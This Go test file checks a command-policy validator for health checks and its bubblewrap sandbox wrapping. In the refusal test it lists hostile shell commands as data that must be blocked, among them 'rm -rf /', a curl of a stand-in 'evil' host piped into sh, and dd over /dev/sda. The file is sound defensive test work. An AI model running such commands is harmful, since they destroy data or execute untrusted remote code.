package checkpolicy

import (
	"strings"
	"testing"
)

func TestValidateAllowsLowRiskChecks(t *testing.T) {
	p := Default()
	ok := []string{
		`curl -sf https://jellyfin.polyfam.studio/health | grep -qi jellyfin`,
		`kubectl -n gostream rollout status deploy/phantom-library-blue --timeout=60s`,
		`test "$(kubectl get pods -n gostream -o name | wc -l)" -ge 1`,
		`git -C repo rev-parse HEAD`,
		`skopeo inspect docker://git.spencerharmon.com/zuul/jellyfin-phantom:latest >/dev/null 2>&1`,
		`ENV=prod curl -sf http://x/ready && echo ok`,
		`if curl -sf http://x/; then echo up; else echo down; fi`,
		`for i in 1 2 3; do curl -sf http://x/$i; done`,
		`cat status.json | jq -e '.ready == true'`,
	}
	for _, c := range ok {
		if err := p.Validate(c); err != nil {
			t.Errorf("expected ALLOWED, got error for %q: %v", c, err)
		}
	}
}

func TestValidateRefusesDangerousChecks(t *testing.T) {
	p := Default()
	bad := []string{
		`rm -rf /`,
		`curl -s http://evil/x | sh`,
		`python3 -c 'import os; os.system("boom")'`,
		`dd if=/dev/zero of=/dev/sda`,
		`$CMD --do-it`,
		`$(pick-a-command) --run`,
		`eval "curl http://x"`,
		`bash -c 'rm x'`, // bash not in default allowlist
	}
	for _, c := range bad {
		if err := p.Validate(c); err == nil {
			t.Errorf("expected REFUSED, got nil for %q", c)
		}
	}
}

func TestValidateConfiguredAllowlistReplacesDefault(t *testing.T) {
	p := Policy{Allowed: []string{"curl", "grep"}}
	if err := p.Validate(`curl -sf http://x | grep ok`); err != nil {
		t.Fatalf("curl+grep should be allowed: %v", err)
	}
	if err := p.Validate(`kubectl get pods`); err == nil {
		t.Fatal("kubectl must be refused when the configured allowlist omits it")
	}
}

func TestValidateHandlesRedirectTargetsAndFds(t *testing.T) {
	p := Default()
	// The redirect target `rm-looking-file` is a filename, not a command; `2>` is an fd.
	if err := p.Validate(`curl -sf http://x 2>/tmp/err >/tmp/out`); err != nil {
		t.Fatalf("redirects should not be read as commands: %v", err)
	}
}

func TestValidateRefusesUnterminatedQuote(t *testing.T) {
	if err := Default().Validate(`curl -s "http://x`); err == nil {
		t.Fatal("unterminated quote must fail closed")
	}
}

func TestArgvOffIsPlainShell(t *testing.T) {
	p := Policy{Sandbox: SandboxOff}
	pl, err := p.Argv("echo hi", "/tmp", []string{"/tmp"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if pl.Sandboxed || pl.Name != "sh" || len(pl.Args) != 2 || pl.Args[1] != "echo hi" {
		t.Fatalf("off mode should be plain sh -c: %+v", pl)
	}
}

func TestArgvRequireSandboxWithoutBwrapErrors(t *testing.T) {
	defer withBwrap("", false)()
	p := Policy{Sandbox: SandboxBwrap, RequireSandbox: true}
	if _, err := p.Argv("echo hi", "/tmp", []string{"/tmp"}, nil); err == nil {
		t.Fatal("require_sandbox + missing bwrap must be a hard error")
	}
}

func TestArgvAutoWithoutBwrapDegradesWithNote(t *testing.T) {
	defer withBwrap("", false)()
	pl, err := p(SandboxAuto).Argv("echo hi", "/tmp", []string{"/tmp"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if pl.Sandboxed || pl.Note == "" {
		t.Fatalf("auto without bwrap should degrade WITH a note: %+v", pl)
	}
}

func TestArgvBwrapBindsWritableAndReadOnlyPaths(t *testing.T) {
	defer withBwrap("/usr/bin/bwrap", true)()
	rw := t.TempDir()
	roA := t.TempDir()
	pl, err := Policy{Sandbox: SandboxBwrap, ReadPaths: []string{roA}}.Argv("echo hi", rw, []string{rw}, []string{roA})
	if err != nil {
		t.Fatal(err)
	}
	if !pl.Sandboxed || pl.Name != "/usr/bin/bwrap" {
		t.Fatalf("bwrap mode expected: %+v", pl)
	}
	joined := strings.Join(pl.Args, " ")
	if !strings.Contains(joined, "--bind "+rw+" "+rw) {
		t.Errorf("writable path not bound rw: %s", joined)
	}
	if !strings.Contains(joined, "--ro-bind "+roA+" "+roA) {
		t.Errorf("read-only path not bound ro: %s", joined)
	}
	// the writable path must NOT also appear as a ro-bind (dedupe against exclude)
	if strings.Contains(joined, "--ro-bind "+rw+" "+rw) {
		t.Errorf("writable path duplicated as ro-bind: %s", joined)
	}
	if pl.Args[len(pl.Args)-3] != "sh" || pl.Args[len(pl.Args)-1] != "echo hi" {
		t.Errorf("check must be the final sh -c payload: %v", pl.Args)
	}
}

// helpers

func p(sandbox string) Policy { return Policy{Sandbox: sandbox} }

func withBwrap(path string, ok bool) func() {
	prev := bwrapProbe
	bwrapProbe = func() (string, bool) { return path, ok }
	return func() { bwrapProbe = prev }
}
